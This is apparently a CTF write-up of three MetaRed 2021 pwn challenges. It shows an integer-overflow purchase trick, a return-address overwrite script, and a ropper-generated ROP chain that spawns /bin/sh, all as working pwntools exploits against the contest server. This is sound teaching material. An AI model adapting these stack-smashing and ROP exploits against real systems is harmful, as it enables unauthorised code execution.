---
title: 'MetaRed 2021 - 4th Stage: Maradona 1,2 and 3'
date: 2021-11-19T00:00:00+00:00
author: Kris
layout: post
image: /images/2021/metared4/title.png
categories:
  - Write-Ups
  - Pwn
---
Here's three more binary exploitation challenges from the 4th edition of MetaRed CTF 2021. Each was the same theme but different exploits were necessary each time.

#### <a name="maradona1"></a>Maradona1 - Pwn - 147 points

This challenge comes one file called `reto` which, upon inspection is a 64 bit ELF binary and from `checksec` we can see canaries are enabled but PIE is disabled. Interesting.

```shell
$ file reto
reto: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=6f7d90b67c33b66b7ccede4fe85a8de9aa1e60c8, for 
GNU/Linux 3.2.0, not stripped
$ checksec reto
[*] 'reto'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

Running the binary we see some basic behaviour, we can login and buy flags from a store. I guess buying the `best` flag is what we need to shoot for but we dont have enough money.

```shell
$ ./reto 
 ------------------------------------------------
|     Welcome to the Argentinian FLAG Store!!!   |
 ------------------------------------------------

Please login 
---Username: A
---Password: B

Hello A                                                                                                                                                     
 ---------------------------------------------------------------------------------------------------------
|   Due to GDPR policies we are going to store this sensitive information in our new imaginary database.   |
 ---------------------------------------------------------------------------------------------------------

Now, tell me what to do:                                                                                                                                    
---[1] Check balance
---[2] Buy Argentinian Flags
---[3] exit

Select an option: 2
For sale:
[1] An Argentinian Flag
[2] The best Argentinian Flag
2

The best Argentinian Flag costs $10000000 and there is only one in stock

Type 1337 to confirm the purchase
1337

You don't have enought funds.

---[1] Check balance
---[2] Buy Argentinian Flags
---[3] exit
```

Loading the binary into Ghidra we can see some typical vulnerabilities whereby the binary loads arbitrary length strings into a fixed length buffer. However we have the stack canary to think about but no obvious memory leaks we could use to leak the canary.

```c
void main(void)
{
  ...
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  i = 0;
  MONEY = 0x44c;
  setup();
  puts(" ------------------------------------------------");
  puts("|     Welcome to the Argentinian FLAG Store!!!   |");
  puts(" ------------------------------------------------");
  puts("\nPlease login ");
  printf("---Username: ");
  gets(username);
  printf("---Password: ");
  gets(password);
  printf("\n\nHello %s\n",username);
  puts(
      " ---------------------------------------------------------------------------------------------------------"
      );
  puts(
      "|   Due to GDPR policies we are going to store this sensitive information in our new imaginary database.   |"
      );
  puts(
      " ---------------------------------------------------------------------------------------------------------\n"
      );
  puts("Now, tell me what to do: ");
  for (; i < 3; i = i + 1) {
    puts("---[1] Check balance");
    puts("---[2] Buy Argentinian Flags");
    puts("---[3] exit");
    printf("\nSelect an option: ");
    __isoc99_scanf(&DAT_00402268,&local_60);
    if (local_60 == 1) {
      printf("\n You have: %d Argentinian pesos\n\n\n",(ulong)MONEY);
    }
    else {
      if (local_60 == 2) {
        puts("For sale:");
        puts("[1] An Argentinian Flag");
        puts("[2] The best Argentinian Flag");
        __isoc99_scanf(&DAT_00402268,&local_5c);
        if (local_5c == 1) {
          puts("An Argentinian Flag costs $1000 Argentinian pesos each. How many do you want to buy?");
          numbuy = 0;
          __isoc99_scanf(&DAT_00402268,&numbuy);
          if (0 < numbuy) {
            totalcost = numbuy * 1000;
            printf("\nTotal cost: %d\n",(ulong)totalcost);
            if ((int)MONEY < (int)totalcost) {
              puts("You don\'t have enough funds\n\n");
            }
            else {
              MONEY = MONEY - totalcost;
              printf("\nYour new balance is: %d\n\n",(ulong)MONEY);
            }
          }
        }
        else {
          if (local_5c == 2) {
            puts("\n\nThe best Argentinian Flag costs $10000000 and there is only one in stock");
            puts("\nType 1337 to confirm the purchase");
            numbuy = 0;
            __isoc99_scanf();
            if (numbuy == 1337) {
              if ((int)MONEY < 100001) {
                puts("\nYou don\'t have enought funds.\n\n");
              }
              else {

                puts("\n[+] Success ");
                printf("La best flag is: ");
                fflush(stdout);
                system("/bin/cat flag");
                putchar(10);
              }
            }
            else {
              puts("\nPurchase not confirmed.\n\n");
            }
          }
        }
      }
      else {
        i = 3;
      }
    }
  }
  puts("\nWe hope you have enjoyed the market.\n\n");
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

The critical point to note is in the flag buying section of code where we do not properly validate the users input which causes a situation where we can overflow the integer:

```c
        puts("An Argentinian Flag costs $1000 Argentinian pesos each. How many do you want to buy?");
          numbuy = 0;
          __isoc99_scanf(&DAT_00402268,&numbuy);
          if (0 < numbuy) {
            totalcost = numbuy * 1000;
            printf("\nTotal cost: %d\n",(ulong)totalcost);
            if ((int)MONEY < (int)totalcost) {
              puts("You don\'t have enough funds\n\n");
            }
            else {
              MONEY = MONEY - totalcost;
              printf("\nYour new balance is: %d\n\n",(ulong)MONEY);
            }
```

With some fiddling around I found that we were able to request to purchase `2147483549` Argentinian flags which equates to a total cost of `-99000` which ends up depositing a large sum of cash into our balance. Once we had that we could simply buy the flag.

The whole exploit can be done by hand as such:

```shell
$ ./reto
 ------------------------------------------------
|     Welcome to the Argentinian FLAG Store!!!   |
 ------------------------------------------------

Please login 
---Username: A
---Password: B


Hello A
 ---------------------------------------------------------------------------------------------------------
|   Due to GDPR policies we are going to store this sensitive information in our new imaginary database.   |
 ---------------------------------------------------------------------------------------------------------

Now, tell me what to do: 
---[1] Check balance
---[2] Buy Argentinian Flags
---[3] exit

Select an option: 2
For sale:
[1] An Argentinian Flag
[2] The best Argentinian Flag
1
An Argentinian Flag costs $1000 Argentinian pesos each. How many do you want to buy?
2147483549

Total cost: -99000

Your new balance is: 100100

---[1] Check balance
---[2] Buy Argentinian Flags
---[3] exit

Select an option: 2
For sale:
[1] An Argentinian Flag
[2] The best Argentinian Flag
2


The best Argentinian Flag costs $10000000 and there is only one in stock

Type 1337 to confirm the purchase
1337

[+] Success 
La best flag is: flag{test_flag_here_for_writeup}
```



#### <a name="maradona2"></a>Maradona2 - Pwn - 400 points

This challenge again comes one file called `reto` which is different to the binary used in Maradona1. Upon inspection is a 64 bit ELF binary, this time statically linked and from `checksec` we can see canaries are enabled but PIE is disabled again.

```shell
$  file reto
reto: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), 
statically linked, BuildID[sha1]=79e7a3cc8e89fcad7cf49991e1b9d63bdd8a2cf8, 
for GNU/Linux 3.2.0, not stripped

$ checksec reto
[*] 'reto'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This time in Ghidra shows the main function shows no sign of the stack canary 

```c
void main(void)
{
  setup();
  puts(" ------------------------------------------------------------------------");
  puts("|             Welcome to the Argentinian FLAG Store UPDATED!!!           |");
  puts("|     Due to inflation problems all our prices are in American dollars   |");
  puts(" ------------------------------------------------------------------------");
  puts("\nPlease login ");
  printf("---Username: ");
  gets(local_38);
  printf("---Password: ");
  gets(local_48);
  printf("\n\nHello %s\n",local_38);
  puts(" ---------------------------------------------------------------------------------------------------------");
  puts("|   Due to GDPR policies we are going to store this sensitive information in our new imaginary database.   |");
  puts(" ---------------------------------------------------------------------------------------------------------\n");
  puts("Now, tell me what to do: ");
  MONEY = 1100;
  for (local_1c = 0; local_1c < 3; local_1c = local_1c + 1) {
    puts("---[1] Check balance");
    puts("---[2] Buy Argentinian Flags");
    puts("---[3] exit");
    printf("\nSelect an option: ");
    __isoc99_scanf(&DAT_004a02e8,&local_4c);
    if (local_4c == 1) {
      printf("\n You have: %d American dollars\n\n\n",(ulong)MONEY);
    }
    else {
      if (local_4c == 2) {
        puts("For sale:");
        puts("[1] An Argentinian Flag");
        puts("[2] The best Argentinian Flag");
        __isoc99_scanf(&DAT_004a02e8,&local_50);
        if (local_50 == 1) {
          puts("An Argentinian Flag costs a dollar. How many flags do you want to buy?");
          local_54 = 0;
          __isoc99_scanf(&DAT_004a02e8,&local_54);
          if (0 < (int)local_54) {
            local_24 = local_54;
            printf("\nTotal cost: %d\n",(ulong)local_54);
            if ((int)MONEY < (int)local_24) {
              puts("You don\'t have enough funds\n\n");
            }
            else {
              MONEY = MONEY - local_24;
              printf("\nYour new balance is: %d\n\n",(ulong)MONEY);
            }
          }
        }
        else {
          if (local_50 == 2) {
            puts("\n\nThe best Argentinian Flag costs $10000000 and there is only one in stock");
            puts("\nType 1337 to confirm the purchase");
            __isoc99_scanf();
            puts("\nPurchase not confirmed.\n\n");
          }
        }
      }
      else {
        local_1c = 3;
      }
    }
  }
  puts("\nWe hope you have enjoyed the market.\n\n");
  return 0;
}
```

The stack overflows are still there though.

Also missing in the decompiler is any reference to the `system()` call that cat the flag. It still is in the binary though so my guess is that some code change made it unreachable. We can see it in the disassembly at address `0x402209`:

```
00402209 b8 00 00        MOV        EAX,0x0
...
00402245 e8 46 78        CALL       printf                            int printf(char * __format, ...)
0040224a 48 8d 3d        LEA        RDI,[s_/bin/cat_flag_004a0483]    = "/bin/cat flag"
00402251 e8 0a 76        CALL       system                            int system(char * __command)


```

So the goal seems very simple. Since PIE is disabled, we know this `0x402209` address is static. So we:

1. Stack overflow, overwrite return pointer with `0x402209`
2. Exit the main func. Get the flag.

In order to find out the offset of the return address, I use `pattern_create` in peda to create a cyclic pattern buffer. Then smash the stack and check what offset became the return address. It looks like this:

```shell
$ gdb ./reto
...

gdb-peda$ pattern_create 80
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A'
gdb-peda$ r
Starting program: /root/metared4/pwn2/reto 
 ------------------------------------------------------------------------
|             Welcome to the Argentinian FLAG Store UPDATED!!!           |
|     Due to inflation problems all our prices are in American dollars   |
 ------------------------------------------------------------------------

Please login 
---Username: 
---Password: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A


Hello AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A
 ---------------------------------------------------------------------------------------------------------
|   Due to GDPR policies we are going to store this sensitive information in our new imaginary database.   |
 ---------------------------------------------------------------------------------------------------------

Now, tell me what to do: 
---[1] Check balance
---[2] Buy Argentinian Flags
---[3] exit

Select an option: 3

We hope you have enjoyed the market.

...
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004022a9 in main ()
gdb-peda$ bt
#0  0x00000000004022a9 in main ()
#1  0x4134414165414149 in ?? ()
#2  0x0000000000000000 in ?? ()
gdb-peda$ pattern_offset 0x4134414165414149
4698452060381725001 found at offset: 72
```

So we know we overwrite our return pointer after 72 bytes. That's all we need to make the exploit work, here's what I wrote in python to make it happen:

```python
#!/usr/bin/python3

from pwn import *

binary = ELF('./reto')

ret = 0x00402209  # beginning of the left in unreachable code
                  # that does cat flag
local = False
if local:
    p = process("./reto")
else:
    p = remote("armando.ctf.cert.unlp.edu.ar", 15002)
p.recvline()
p.sendlineafter(b'Username: ', b'')

# ret addr offset: 72
payload = b'A' * 72
payload += p64(ret)

p.sendlineafter(b'Password: ', payload)
p.interactive()
```

And running it, we just have to select option 3 to exit and we successfully `ret` to address `0x00402209` and grab a flag.

```shell
$ ./exploit.py
[*] 'reto'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './reto': pid 155133
[*] Switching to interactive mode

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    "@
 ---------------------------------------------------------------------------------------------------------
|   Due to GDPR policies we are going to store this sensitive information in our new imaginary database.   |
 ---------------------------------------------------------------------------------------------------------

Now, tell me what to do: 
---[1] Check balance
---[2] Buy Argentinian Flags
---[3] exit

Select an option: $ 3

We hope you have enjoyed the market.

[+] Success 
La best flag is: flag{test_flag_here_for_writeup}
```



#### <a name="maradona3"></a>Maradona3 - Pwn - 436 points

This challenge again comes one file called `reto` which is different to the binary used in Maradona1 and Maradona2. Upon inspection is a 64 bit ELF binary, again statically linked and from `checksec` we can see canaries are enabled but PIE is disabled again.

```shell
$ file reto
reto: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=eb4e28fde084cb3be681236587e087acc4a60895, for GNU/Linux 3.2.0, not stripped

$ checksec reto
[*] 'reto'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

In Ghidra, we see the main function has changed again. There is no reference to `system()` at all now and no way to use logic bugs to gain a flag at all. We need RCE for reals this time.

Since the binary is statically linked we do not have a system `libc` to work with. Meaning we have no `ret2libc` vectors we might usually be able to invoke `system()` through. 

This doesn't really matter though, we can make use of things lying around in the binary to build a ROP chain using an `execve() ` system call.

To create the ROP chain I used the `ropper` tool from [here](https://github.com/sashs/Ropper). It was the first time I used this tool so I was very impressed with the output. 

```shell
$ ropper --file reto --chain "execve cmd=/bin/sh" --badbytes 0a                                                                                           
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] filtering badbytes... 100%
[LOAD] removing double gadgets... 100%
[INFO] ROPchain Generator for syscall execve:
[INFO] write command into data section
rax 0xb
rdi address to cmd
rsi address to null
rdx address to null

[INFO] Try to create chain which fills registers without delete content of previous filled registers
[*] Try permuation 1 / 24
[INFO] Look for syscall gadget
[INFO] syscall gadget found
[INFO] generating rop chain
#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 6dc586ceff659de75407270f256a5a72c31261df44c0167bae678c5d0ec84606
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x0000000000008cab) # 0x0000000000408cab: pop r13; ret; 
rop += '//bin/sh'
rop += rebase_0(0x00000000000022bf) # 0x00000000004022bf: pop rbx; ret; 
rop += rebase_0(0x00000000000cb0e0)
rop += rebase_0(0x0000000000070f22) # 0x0000000000470f22: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000008cab) # 0x0000000000408cab: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x00000000000022bf) # 0x00000000004022bf: pop rbx; ret; 
rop += rebase_0(0x00000000000cb0e8)
rop += rebase_0(0x0000000000070f22) # 0x0000000000470f22: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000001821) # 0x0000000000401821: pop rdi; ret; 
rop += rebase_0(0x00000000000cb0e0)
rop += rebase_0(0x00000000000766c6) # 0x00000000004766c6: pop rsi; ret; 
rop += rebase_0(0x00000000000cb0e8)
rop += rebase_0(0x000000000000176b) # 0x000000000040176b: pop rdx; ret; 
rop += rebase_0(0x00000000000cb0e8)
rop += rebase_0(0x000000000004e283) # 0x000000000044e283: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x000000000001c3fc) # 0x000000000041c3fc: syscall; ret; 
print rop
[INFO] rop chain generated!
```



With a tiny bit of tweeking all that was necessary was to find the correct return pointer overwrite offset and send the rop chain. I used the same technique from Maradona2 to find that this time the return address was at offset 56 on the stack.

So my exploit was:

```python
#!/usr/bin/python3

from pwn import *

binary = ELF('./reto')

local = False

# ret addr offset: 56
if local:
    pp = process("./reto")
else:
    pp = remote("armando.ctf.cert.unlp.edu.ar", 15003)
pp.recvline()
pp.sendlineafter(b'Username: ', b'')

# Gen: ropper --file reto --chain "execve cmd=/bin/sh" --badbytes 0a

from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 6dc586ceff659de75407270f256a5a72c31261df44c0167bae678c5d0ec84606
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''
rop += rebase_0(0x0000000000008cab) # 0x0000000000408cab: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x00000000000022bf) # 0x00000000004022bf: pop rbx; ret; 
rop += rebase_0(0x00000000000cb0e0)
rop += rebase_0(0x0000000000070f22) # 0x0000000000470f22: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000008cab) # 0x0000000000408cab: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x00000000000022bf) # 0x00000000004022bf: pop rbx; ret; 
rop += rebase_0(0x00000000000cb0e8)
rop += rebase_0(0x0000000000070f22) # 0x0000000000470f22: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000001821) # 0x0000000000401821: pop rdi; ret; 
rop += rebase_0(0x00000000000cb0e0)
rop += rebase_0(0x00000000000766c6) # 0x00000000004766c6: pop rsi; ret; 
rop += rebase_0(0x00000000000cb0e8)
rop += rebase_0(0x000000000000176b) # 0x000000000040176b: pop rdx; ret; 
rop += rebase_0(0x00000000000cb0e8)
rop += rebase_0(0x000000000004e283) # 0x000000000044e283: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x000000000001c3fc) # 0x000000000041c3fc: syscall; ret;

payload = b'A' * 56
payload += rop

pp.sendlineafter(b'Password: ', payload)
pp.interactive()
```

And running it gave us a nice shell where we could grab the flag:

```shell
$ ./exploit.py
[*] 'reto'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './reto': pid 155588
[*] Switching to interactive mode

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xab\x8c@
 ---------------------------------------------------------------------------------------------------------
|   Due to GDPR policies we are going to store this sensitive information in our new imaginary database.   |
 ---------------------------------------------------------------------------------------------------------

Now, tell me what to do: 
---[1] Check balance
---[2] Buy Argentinian Flags
---[3] exit

Select an option: $ 3

We hope you have enjoyed the market.

$ cat flag
flag{test_flag_here_for_writeup}
```

Overall the idea of a single binary theme with three exploits was a lot of fun. It meant a lot less ramp up time per exploit development which I enjoyed.

